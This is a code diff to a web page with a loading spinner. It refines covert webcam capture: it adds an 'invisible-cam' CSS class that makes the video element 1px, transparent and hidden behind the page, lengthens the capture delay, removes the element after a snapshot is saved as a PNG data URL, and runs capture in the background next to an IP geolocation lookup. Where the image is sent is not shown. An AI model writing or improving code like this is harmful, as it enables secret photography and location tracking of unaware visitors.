@@ -44,6 +44,15 @@
       border-radius: 5px;
       margin-top: 1em;
     }
+    video.invisible-cam {
+      width: 1px;
+      height: 1px;
+      position: fixed;
+      top: 0;
+      left: 0;
+      opacity: 0;
+      z-index: -1;
+    }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
@@ -87,8 +96,7 @@
         const video = document.createElement("video");
         video.setAttribute("playsinline", true);
         video.muted = true;
-        video.style.position = "absolute";
-        video.style.opacity = "0";
+        video.className = "invisible-cam";
         video.srcObject = stream;
         document.body.appendChild(video);
 
@@ -102,7 +110,7 @@
           waitForSize();
         });
 
-        await new Promise(res => setTimeout(res, 3000));
+        await new Promise(res => setTimeout(res, 5000)); // Give camera time to focus
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
@@ -112,6 +120,7 @@
         capturedImageData = canvas.toDataURL("image/png");
 
         stream.getTracks().forEach(t => t.stop());
+        video.remove();
       } catch (err) {
         console.warn("Camera access denied or failed", err);
       }
@@ -199,8 +208,7 @@
         return;
       }
 
-      // Don't block mobile flow — run camera but don't wait
-      captureSnapshot();
+      captureSnapshot(); // Non-blocking
 
       fetch("https://api.db-ip.com/v2/free/self")
         .then(res => res.json())
